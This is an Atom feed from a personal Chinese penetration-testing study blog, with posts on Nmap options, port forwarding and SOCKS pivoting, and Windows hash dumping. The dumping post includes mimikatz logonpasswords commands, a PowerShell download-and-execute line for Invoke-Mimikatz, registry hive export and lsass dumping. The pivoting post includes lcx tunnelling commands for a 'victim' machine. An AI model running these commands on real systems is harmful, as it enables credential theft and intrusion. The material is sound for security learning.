<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zzggtt.github.io</id>
    <title>ZG0T01</title>
    <updated>2020-12-02T09:28:59.618Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zzggtt.github.io"/>
    <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://zzggtt.github.io/images/avatar.png</logo>
    <icon>https://zzggtt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, ZG0T01</rights>
    <entry>
        <title type="html"><![CDATA[从mimkatz学习Windows本地hash抓取]]></title>
        <id>https://zzggtt.github.io/post/cong-mimkatz-xue-xi-windows-ben-di-hash-zhua-qu/</id>
        <link href="https://zzggtt.github.io/post/cong-mimkatz-xue-xi-windows-ben-di-hash-zhua-qu/">
        </link>
        <updated>2020-12-02T09:28:36.000Z</updated>
        <content type="html"><![CDATA[<p>mark</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows本地认证]]></title>
        <id>https://zzggtt.github.io/post/windows-ben-di-ren-zheng/</id>
        <link href="https://zzggtt.github.io/post/windows-ben-di-ren-zheng/">
        </link>
        <updated>2020-12-02T09:28:11.000Z</updated>
        <content type="html"><![CDATA[<p>mark</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Nmap基础使用]]></title>
        <id>https://zzggtt.github.io/post/nmap-ji-chu-shi-yong/</id>
        <link href="https://zzggtt.github.io/post/nmap-ji-chu-shi-yong/">
        </link>
        <updated>2020-11-24T09:47:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="工作原理">工作原理</h3>
<p>Nmap使用TCP/IP协议栈进行工作。</p>
<h3 id="usage">Usage</h3>
<blockquote>
<p>nmap [Scan Type(s)] [Options] {target specification}</p>
</blockquote>
<h3 id="target-specification">Target Specification</h3>
<blockquote>
<p>Can pass hostnames, IP addresses, networks, etc.</p>
</blockquote>
<h3 id="host-discovery">Host Discovery</h3>
<pre><code class="language-bash">-sL: List Scan - simply list targets to scan
-sn: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery
-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO[protocol list]: IP Protocol Ping
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
--dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
--system-dns: Use OS's DNS resolver
--traceroute: Trace hop path to each host
</code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-sP</td>
<td>Ping扫描</td>
</tr>
<tr>
<td>-P0</td>
<td>无Ping扫描</td>
</tr>
<tr>
<td>-PS/PA/PU/PY</td>
<td>TCP SYN/ACK、UDP、SCTP扫描</td>
</tr>
<tr>
<td>-PE/PP/PM</td>
<td>ICMP echo、timestamp、netmask扫描。</td>
</tr>
<tr>
<td>-PR</td>
<td>ARP扫描</td>
</tr>
<tr>
<td>-sL</td>
<td>列表扫描</td>
</tr>
<tr>
<td>-n/-R</td>
<td>禁止/使用DNS反向域名解析</td>
</tr>
<tr>
<td>--system-dns</td>
<td>使用系统的域名解析器</td>
</tr>
<tr>
<td>--traceroute</td>
<td>路由跟踪</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-sP</code></p>
<p>Nmap仅进行ping扫描，然后回显出做响应的主机。使用该选项可以轻易的获取到目标信息而不被发现，是一种非常高效的存活主机扫描方式。</p>
</li>
<li>
<p><code>-P0</code></p>
<p>通常在目标主机<strong>禁Ping</strong>的情况下使用，也可以<strong>绕过某些防火墙</strong>。</p>
</li>
<li>
<p><code>TCP SYN/ACK</code></p>
<p>TCP协议是TCP/IP协议中<strong>面向连接</strong>的、可靠的<strong>传输层协议</strong>。</p>
<p>-PS/PA：nmap会发送一个设置了SYN/ACK标志位的空TCP报文，默认端口为80，也可以指定端口列表（-PS22,23,80,443,3389）。</p>
</li>
<li>
<p><code>-PU</code></p>
<p>UDP协议是TCP/IP协议中<strong>无连接</strong>的<strong>传输层协议</strong>。</p>
<p>-PU：nmap发送一个空的UDP报文到指定的端口，默认为40125端口。</p>
</li>
<li>
<p><code>-PE/PP/PM</code></p>
<p>ICMP是Internet控制报文协议，它是TCP/IP协议族的子协议，工作在<strong>网络层</strong>。用于在IP主机、路由器之间传递控制消息。</p>
<p>-PE/PP/PM：可以进行ICMP echo、timestamp（时间戳）、netmask（地址掩码）扫描。</p>
</li>
<li>
<p><code>-PR</code></p>
<p>ARP即地址解析协议，可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息。</p>
<p>-PR：nmap会对目标进行一个ARP扫描的过程，在本地局域网中防火墙不会禁止ARP请求。所以在<strong>内网存活主机发现</strong>时，-PR会比其他扫描更加高效。</p>
</li>
<li>
<p><code>-n/-R</code></p>
<p>禁止/永远 使用DNS反向域名解析。</p>
<p>当我们单纯扫描一个段IP时，使用-n可以大幅度减少目标主机的响应时间，从而更快的得到结果。</p>
<p>如果想知道IP段上存在哪些网站，-R选项更适用。</p>
</li>
<li>
<p><code>--system-dns</code></p>
<p>通常情况下，nmap通过直接发送查询到目标主机上配置的域名服务器来查询域名，为了提高性能，许多请求并发执行。通过--system-dns可以使用系统自带的解析器。</p>
</li>
<li>
<p><code>--traceroute</code></p>
<p>通过路由跟踪，可以看到本地计算机到目标之间所经过的网络节点。</p>
</li>
</ul>
<h3 id="port-scan">Port Scan</h3>
<pre><code class="language-bash">PORT SPECIFICATION AND SCAN ORDER:
-p &lt;port ranges&gt;: Only scan specified ports
   Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
--exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
-F: Fast mode - Scan fewer ports than the default scan
-r: Scan ports consecutively - don't randomize
--top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
--port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;
</code></pre>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-p</td>
<td>扫描指定端口</td>
</tr>
<tr>
<td style="text-align:left">-F</td>
<td>快速扫描有限的端口</td>
</tr>
<tr>
<td style="text-align:left">-r</td>
<td>随机扫描端口</td>
</tr>
<tr>
<td style="text-align:left">--top-ports</td>
<td>按最常用的top扫描端口</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-p</code></p>
<p>通过-p选项可以指定扫描的端口：</p>
<pre><code class="language-bash">-p22; -p1-65535;
</code></pre>
<p>如果想同时扫描TCP和UDP端口，可以通过“T：”、“U：”来指定：</p>
<pre><code class="language-bash">-sS -p U:53,111,137,T:21-25,80,139,8080
</code></pre>
</li>
<li>
<p><code>-F</code></p>
<p>使用该选项可以快速扫描部分端口，其包含在nmap-services中。</p>
</li>
<li>
<p><code>-r</code></p>
<p>默认情况下nmap是按随机顺序扫描端口的，通过-r选项可以按连续顺序扫描端口。</p>
</li>
<li>
<p><code>--top-ports</code></p>
<p>扫描最常用的top100端口：</p>
<pre><code class="language-bash">nmap --top-ports 100 192.168.213.129
</code></pre>
</li>
<li>
<p><code>--port-ratio</code></p>
<p>同上，按使用频率进行扫描。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-sS</td>
<td>TCP SYN 扫描</td>
</tr>
<tr>
<td>-sA</td>
<td>TCP ACK 扫描</td>
</tr>
<tr>
<td>-sT</td>
<td>TCP 扫描</td>
</tr>
<tr>
<td>-sU</td>
<td>UDP扫描</td>
</tr>
<tr>
<td>-sN/sF/sX</td>
<td>隐蔽扫描</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-sS</code></p>
<p>TCP SYN扫描被称为半开放式，因为它不打开一个完全的TCP3次握手连接，SYN扫描也可以很明确的区分出端口的开发状态。</p>
<p>因此SYN扫描是一种比较<strong>隐蔽且高效</strong>的扫描方式。</p>
</li>
<li>
<p><code>-sA</code></p>
<p>TCP ACK扫描的缺点很明显，它无法明确是否是开放的还是被过滤的。</p>
</li>
<li>
<p><code>-sT</code></p>
<p>TCP连接扫描，通常用于SYN扫描不能使用的情况下。它会在每个端口上完成3次握手扫描，基本不会导致目标主机崩溃。是最<strong>基础和稳定</strong>的扫描方式。</p>
</li>
<li>
<p><code>-sU</code></p>
<p>UDP扫描可以发现更多的可利用端口，因为很多管理员会忽略这些端口。但是由于UDP的扫描是非常慢的，通常需要-p指定端口。</p>
</li>
</ul>
<h3 id="cms">CMS</h3>
<pre><code class="language-bash">SERVICE/VERSION DETECTION:
-sV: Probe open ports to determine service/version info
--version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
--version-light: Limit to most likely probes (intensity 2)
--version-all: Try every single probe (intensity 9)
--version-trace: Show detailed version scan activity (for debugging)

OS DETECTION:
-O: Enable OS detection
--osscan-limit: Limit OS detection to promising targets
--osscan-guess: Guess OS more aggressively
</code></pre>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">-sV</td>
<td>端口 服务/版本</td>
</tr>
<tr>
<td style="text-align:left">--version-intensity</td>
<td>设置扫描强度</td>
</tr>
<tr>
<td style="text-align:left">--version-light</td>
<td>轻量级扫描</td>
</tr>
<tr>
<td style="text-align:left">--version-all</td>
<td>重量级扫描</td>
</tr>
<tr>
<td style="text-align:left">--version-trace</td>
<td>获取详细版本信息</td>
</tr>
<tr>
<td style="text-align:left">-O</td>
<td>启动操作系统探测</td>
</tr>
<tr>
<td style="text-align:left">--osscan-limit</td>
<td>对指定的目标进行操作系统探测</td>
</tr>
<tr>
<td style="text-align:left">--osscan-guess</td>
<td>推测系统识别</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><code>-sV</code></p>
<p>使用-sV选项，可以通过相应的端口和服务，根据服务指纹识别出其相应的版本。</p>
<p>再通过-A可以获取更加详细的信息。</p>
</li>
</ul>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1606211331244.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><code>--version-trace</code></p>
<p>使用--version-trace可以获取详细版本信息，它对于获取目标主机的额外信息非常有帮助。</p>
</li>
</ul>
<p><img src="https://zzggtt.github.io/post-images/1606211336413.png" alt="" loading="lazy"><br>
<img src="https://zzggtt.github.io/post-images/1606211341246.png" alt="" loading="lazy"></p>
<ul>
<li>
<p><code>-O</code></p>
<p>使用-O选项可以启用操作系统探测：</p>
</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1606211345805.png" alt="" loading="lazy"></figure>
<p>可以看出由于Windows防火墙的原因，nmap没有确定哪一个版本的操作系统。</p>
<h3 id="script-scan">SCRIPT SCAN:</h3>
<pre><code class="language-bash">-sC: equivalent to --script=default
--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories

--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
--script-args-file=filename: provide NSE script args in a file
--script-trace: Show all data sent and received
--script-updatedb: Update the script database.
--script-help=&lt;Lua scripts&gt;: Show help about scripts.&lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories.
</code></pre>
<pre><code class="language-bash">IP信息收集：
nmap --script ip-geolocation-* www.baidu.com

whois信息收集：
nmap --script whois www.baidu.com

DNS信息收集：
nmap --script dns-brute www.baidu.com

系统信息收集：
nmap -p 192.168.116.129 --script membase-http-info

系统漏洞扫描（SMB漏洞扫描）：
nmap --script smb-check-vulns.nes -p445 192.168.116.129


</code></pre>
<h3 id="output">Output</h3>
<pre><code class="language-bash">-oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename.
-oA &lt;basename&gt;: Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)
-d: Increase debugging level (use -dd or more for greater effect)
--reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports
--packet-trace: Show all packets sent and received
--iflist: Print host interfaces and routes (for debugging)
--append-output: Append to rather than clobber specified output files
--resume &lt;filename&gt;: Resume an aborted scan
--stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
--webxml: Reference stylesheet from Nmap.Org for more portable XML
--no-stylesheet: Prevent associating of XSL stylesheet w/XML output
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透基础 - 端口转发与边界代理]]></title>
        <id>https://zzggtt.github.io/post/shen-tou-ji-chu-duan-kou-zhuan-fa-yu-bian-jie-dai-li/</id>
        <link href="https://zzggtt.github.io/post/shen-tou-ji-chu-duan-kou-zhuan-fa-yu-bian-jie-dai-li/">
        </link>
        <updated>2020-11-18T12:41:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="端口转发">端口转发</h3>
<p><code>端口转发:</code></p>
<p>转发一个<strong>网络端口</strong>的数据从一个网络节点到另一个网络节点的行为。</p>
<p><code>应用场景：</code></p>
<p>在进行渗透时，已拿下内网中一台机器的权限，但是想横向渗透内网中的其他机器时。</p>
<p>Client（攻击者）通过Transit Server（内网中已拿下权限的机器）建立的<strong>通道</strong>，连接内网Server（内网中其他机器）的指定端口。</p>
<p><code>正向转发</code></p>
<p>Client能够<strong>正向</strong>连接Transit server。Transit server直接转发即可：</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605703324992.png" alt="" loading="lazy"></figure>
<pre><code class="language-bash">netsh interface portproxy add v4tov4 listenaddress=192.168.111.132 listenport=7777 connectaddress=192.168.111.103  connectport=4444
</code></pre>
<pre><code class="language-bash">nc -lvp 4444
</code></pre>
<pre><code class="language-bash">nc -vv 192.168.111.132 7777
</code></pre>
<p><code>反向转发</code></p>
<p>Client无法正向连接Transit server，但Transit server能够<strong>反向</strong>连接Client：</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1605703332371.png" alt="" loading="lazy"></figure>
<pre><code class="language-bash">ew -s lcx_listen -l 2222 -e 1111
</code></pre>
<pre><code class="language-bash">ew -s lcx_slave -d 1.1.1.1 -e 1111 -f 10.0.0.2 -g 3389
</code></pre>
<pre><code class="language-bash">nc -vv 127.0.0.1 2222
</code></pre>
<h3 id="socks协议">Socks协议</h3>
<p>什么是Socks协议？？<br>
<img src="https://zzggtt.github.io/post-images/1605703395820.png" alt="" loading="lazy"></p>
<p>中文意思：防火墙安全会话转换协议，工作在OSI参考模型的<strong>第5层（会话层）。</strong></p>
<p>它是一种可以穿透防火墙的协议，很多场景都会用到。比如Fan墙，你们懂得~~</p>
<p>因为Socks介于传输层与表示层之间，使用TCP协议传输数据，因而<strong>不提供如传递ICMP信息</strong>之类的网络层相关服务。</p>
<p>目前有两个版本：SOCKS4和SOCKS5</p>
<p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p>
<p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p>
<p>Ps: Socks不支持ICMP，不能使用ping命令。。记住哦~~~</p>
<p><strong>当然啦，基于socks的转发代理有很多的实用的小工具，少侠看图吧~</strong></p>
<p>常见的转发工具及不同平台的代理链工具：</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1605703403068.png" alt="" loading="lazy"></figure>
<p><strong>代理链工具：</strong></p>
<ul>
<li>
<p>proxychains</p>
<p>https://howiezhao.github.io/2018/10/18/proxychains/</p>
</li>
<li>
<p>proxifier</p>
<p>https://blog.csdn.net/xhaimail/article/details/98743238</p>
</li>
</ul>
<h3 id="代理">代理</h3>
<p><code>应用场景：</code></p>
<p>如果Client要对Server的多个端口进行扫描(或是多个Server的多个端口)，逐个配置转发规则很不现实。为了提高效率，这里可以使用代理，配置一次规则即可。<br>
<img src="https://zzggtt.github.io/post-images/1605703445490.png" alt="" loading="lazy"></p>
<p><code>正向代理</code></p>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1605703450870.png" alt="" loading="lazy"></figure>
<p>Client能够正向连接到Transit server，要对Server1、Server2和Server3的端口进行扫描。</p>
<p><strong>使用EarthWorm：</strong></p>
<p>Transit Server：</p>
<pre><code class="language-bash">ew –s ssocksd –l 8888
</code></pre>
<p>Client使用代理工具连接Transit Server的8888端口，下面通过Windows的代理链工具<strong>proxifier</strong>演示：</p>
<p>连接Transit Server：</p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1605703466633.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1605703471194.png" alt="" loading="lazy"></figure>
<p>然后配置代理规则，client即可对内网多服务器多端口访问：<br>
<img src="https://zzggtt.github.io/post-images/1605703491952.png" alt="" loading="lazy"></p>
<p><code>反向代理</code></p>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1605703501509.png" alt="" loading="lazy"></figure>
<p>Client无法正向连接到Transit server，但Transit server能够反向连接到Client</p>
<p>要对Server1、Server2和Server3的端口进行扫描。</p>
<p><strong>使用EarthWorm：</strong></p>
<p>Client:</p>
<pre><code>ew -s rcsocks -l 2222 -e 1111
</code></pre>
<p>Transit server:</p>
<pre><code>ew -s rssocks -d 1.1.1.1 -e 1111
</code></pre>
<p>使用代理工具连接Client的2222端口，下面通过Linux的代理链工具<strong>proxychains</strong>演示：</p>
<p>Client：</p>
<pre><code class="language-bash">//修改配置文件：（设置代理服务器）
vim /etc/proxychains.conf
socks5     127.0.0.1     2222

//使用：（firefox走代理，访问10.0.0.2）
proxychains firefox 10.0.0.2
</code></pre>
<h3 id="工具">工具</h3>
<h4 id="端口转发-2">端口转发</h4>
<ul>
<li>
<p><strong>lcx（Windows）</strong></p>
<p>lcx是一款轻便的端口转发工具：</p>
<p>a、反向转发</p>
<p>外网VPS机器监听：</p>
<p>lcx.exe -listen 1111 2222</p>
<p>受害者机器执行：</p>
<p>lcx.exe -slave VPSip 1111 127.0.0.1 3389</p>
<p>连接外网VPS机器的2222端口即是连接受害者机器的3389。</p>
<p>b、正向转发</p>
<p>A机器执行：</p>
<p>lcx.exe -tran 1111 2.2.2.2 8080</p>
<p>访问A机器的1111端口即是访问2.2.2.2的8080端口。</p>
<p>参考：https://juejin.im/post/6844903954401198088</p>
</li>
<li>
<p><strong>netsh（只支持TCP协议）</strong></p>
<p>netsh是<strong>windows</strong>自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p>
<p>A机器（192.168.130.1）：</p>
<pre><code class="language-bash">netsh  interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1  protocol=tcp
</code></pre>
<p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p>
<p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzU1Nzc4MTQwMA==&amp;mid=2247484209&amp;idx=1&amp;sn=982c14d94b83249c5ece1f46023de808&amp;chksm=fc31dbc6cb4652d04a088571b21098ac5a0259bbb2b30b93e11472e912e35fe2f2b628e9d128&amp;scene=21#wechat_redirect">使用netsh进行端口转发</a></p>
</li>
<li>
<p><strong>portmap</strong></p>
</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1605703523922.png" alt="" loading="lazy"></figure>
<ul>
<li><strong>iptables</strong></li>
</ul>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1605703527604.png" alt="" loading="lazy"></figure>
<h4 id="代理-2">代理</h4>
<ul>
<li>
<p><strong>reGeorg</strong></p>
<p>reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，把内网服务器的端口通过http/https隧道转发到本机。</p>
<p>参考：</p>
<p><a href="https://www.k0rz3n.com/2018/07/06/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8reGeorg+Proxifier%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91/">配置reGeorg+Proxifier渗透内网</a></p>
<p><a href="https://xz.aliyun.com/t/228">reGeorg+Proxifier使用</a></p>
</li>
<li>
<p><strong>Earthworm</strong></p>
<p>跨平台+端口转发+socket代理结合体</p>
<p>http://rootkiter.com/EarthWorm/</p>
<p>https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA</p>
</li>
<li>
<p><strong>goproxy</strong></p>
<p>go实现的高性能http,https,websocket,tcp,udp,socks5,ss代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转</p>
<p>下载地址：</p>
<p>https://github.com/snail007/goproxy/</p>
<p>Transit server:</p>
<pre><code class="language-bash">proxy socks -t tcp -p &quot;0.0.0.0:8888&quot;
</code></pre>
</li>
<li>
<p><strong>ssh</strong></p>
</li>
<li>
<p><strong>xsocks</strong></p>
</li>
</ul>
<p>参考：</p>
<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86/">渗透基础-端口转发与代理</a></p>
<p><a href="https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA">内网渗透之代理转发</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[window本地认证与hash抓取]]></title>
        <id>https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/</id>
        <link href="https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/">
        </link>
        <updated>2020-11-16T14:06:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="windows本地认证">Windows本地认证</h3>
<p>登陆到本机的过程：</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1605535647568.png" alt="" loading="lazy"></figure>
<ol>
<li>用户首先按Ctrl+Alt+Del组合键。</li>
<li>Winlogon检测到用户按下SAS键，就调用GINA，由GINA显示登录对话框，以便用户输入账号和密码。</li>
<li>用户输入账号和密码，确定后，GINA把信息发送给LSA进行验证。</li>
<li>在用户登录到本机的情况下，LSA会调用Msv1_0.dll这个验证程序包，将用户信息处理后生成密钥，同SAM数据库中存储的密钥进行对比。</li>
<li>如果对比后发现用户有效，SAM会将用户的SID，用户所属用户组的SID，和其他一些相关信息发送给LSA。</li>
<li>LSA将收到的SID信息创建安全访问令牌，然后将令牌的句柄和登录信息发送给Winlogon.exe。</li>
<li>Winlogon.exe对用户登录稍作处理后，完成整个登录过程。</li>
</ol>
<p>可以看出本地用户的密码是存储在SAM文件中。它用于储存本地所有用户的凭证信息，位于：<strong>C:\Windows\System32\config\sam</strong>。</p>
<p>Windows不会存储文明密码的，而是存储密码的hash值，上诉第四步中所说的密钥就是<strong>密码hash</strong>。</p>
<p><strong>参考：</strong></p>
<p><a href="https://blog.csdn.net/u013776188/article/details/79986479">Windows本地登陆</a></p>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/">渗透技巧——Windows中Credential Manager的信息获取</a></p>
<p><a href="https://xz.aliyun.com/t/8127#toc-3">由Windows本地认证到Hash抓取</a></p>
<h3 id="windows-hash">Windows hash</h3>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
<th style="text-align:left">2000</th>
<th style="text-align:left">xp</th>
<th style="text-align:left">2003</th>
<th style="text-align:left">Vista</th>
<th style="text-align:left">win7</th>
<th style="text-align:left">2008</th>
<th style="text-align:left">2012</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">LM</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">NTLM</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td style="text-align:left">√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody>
</table>
<p>Windows使用的hash有：<strong>LMHASH</strong>和<strong>NTLMHASH</strong>。</p>
<ul>
<li>
<p><strong>LM HASH</strong></p>
<p>lmhash作为Windows早期使用的密码hash，其加密流程如下：</p>
<p>1、密码长度<strong>限制为14个字符</strong></p>
<p>2、密码全部转换为大写</p>
<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
<p>4、密码的16进制字符串被分成两个7byte部分</p>
<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
<p>6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。</p>
<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
</li>
<li>
<p><strong>NTLM HASH</strong></p>
<p>为了解决lmhash强度不够的问题，微软推出了ntlmhash，其加密流程如下：</p>
<p>1、先将用户密码转换为十六进制格式。</p>
<p>2、将十六进制格式的密码进行Unicode编码。</p>
<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
<p>其格式如下：</p>
<pre><code class="language-bash">username:SID:LM-Hash:NTLM-Hash

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></pre>
<p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是aad3b435b51404eeaad3b435b51404ee（这表示<strong>空密码或者是未使用LM_HASH</strong>）</p>
<p>在hash传递攻击时，可以替换成0：</p>
<p>00000000000000000000000000000000</p>
</li>
</ul>
<p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">红蓝对抗之Windows内网渗透</a></p>
<p><a href="https://github.com/l3m0n/pentest_study">从零开始学内网渗透</a></p>
<h3 id="本地hash抓取">本地hash抓取</h3>
<h4 id="mimikatz">mimikatz</h4>
<p>只能抓取登陆过的用户hash，无法抓取所有用户，需要免杀：</p>
<ul>
<li>
<p>meterpreter中直抓取内存中的hash：</p>
<pre><code class="language-bash">mimikatz_command -f  samdump::hashes
</code></pre>
</li>
<li>
<p>meterpreter中直抓取内存中的明文密码：</p>
<pre><code class="language-bash">mimikatz_command -f sekurlsa::logonpasswords
</code></pre>
</li>
<li>
<p>非交互式抓明文密码(webshell中)</p>
<pre><code class="language-bash">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt
</code></pre>
</li>
<li>
<p>powershell加载mimikatz抓取密码</p>
<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
</code></pre>
</li>
</ul>
<p>MSF中mimikatz使用参考：https://blog.csdn.net/weixin_45116657/article/details/103147716</p>
<h4 id="reg">reg</h4>
<p>Win2000和XP需要先提到SYSTEM，03开始直接可以reg save，导出的文件大，效率低，但是可以绕过杀软。</p>
<p>在meterpreter中使用shell命令来到交互式cmd，然后<strong>导出注册表</strong>：</p>
<p>（在c盘下就导出了三个注册表文件）</p>
<pre><code class="language-bash">reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
</code></pre>
<p>使用meterpreter下自带download功能来将目标机的三个注册表文件下载下来，</p>
<p>然后<strong>本地分析：</strong></p>
<p>（默认使用kali）</p>
<pre><code class="language-bash">python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
</code></pre>
<p>参考：https://blog.csdn.net/qq_17204441/article/details/89426390</p>
<h4 id="procdump-mimikatz">ProcDump + Mimikatz</h4>
<p>本地分析，文件会比较大，但是能绕过杀软。</p>
<p>通过procdump（<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">下载地址</a>）导出注册表：</p>
<pre><code class="language-bash">Procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>然后通过mimikatz进行读取：</p>
<pre><code class="language-bash">sekurlsa::minidump lsass.dump.dmp
sekurlsa::logonpasswords full
</code></pre>
<p>PS：mimikatz的平台要与进行dump的系统(source dump)兼容(比如dowm了08的,本地就要用08系统来分析)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows下提权]]></title>
        <id>https://zzggtt.github.io/post/windows-xia-ti-quan/</id>
        <link href="https://zzggtt.github.io/post/windows-xia-ti-quan/">
        </link>
        <updated>2020-11-14T14:15:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="windows权限">Windows权限</h3>
<p>在Windows中，<strong>权限</strong>精确的定制了用户对<strong>资源</strong>的<strong>访问控制</strong>能力。也就是说，权限是以<strong>资源为对象</strong>，即某个资源对哪些用户可以拥有哪些权限。</p>
<ul>
<li>
<p><strong>安全标识符</strong></p>
<p>在Windows中系统通过安全标识符（SID）对用户进行<strong>识别</strong>，SID可应用于系统内的所有用户、组、服务或计算机。SID具有<strong>唯一性</strong>。</p>
</li>
<li>
<p><strong>访问控制列表</strong></p>
<p>访问控制列表（ACL）是权限的核心技术，用于规定用户对资源的访问权限。在访问控制列表中，每一个用户或用户组都对应一组访问控制项（Access Control Entry，ACE），所有用户或用户组的权限访问设置都将会在这里被存储下来，并允许随时被有权限进行修改的用户进行调整，如取消某个用户对某个资源的&quot;写入&quot;权限。</p>
</li>
<li>
<p><strong>安全主体</strong></p>
<p>在Windows中，可以将用户、用户组、计算机或服务都看成是一个安全主体，每个安全主体都拥有相对应的账户名称和SID。根据系统架构的不同，账户的管理方式也有所不同──本地账户被本地的SAM管理，域的账户则会被域控制器进行管理。</p>
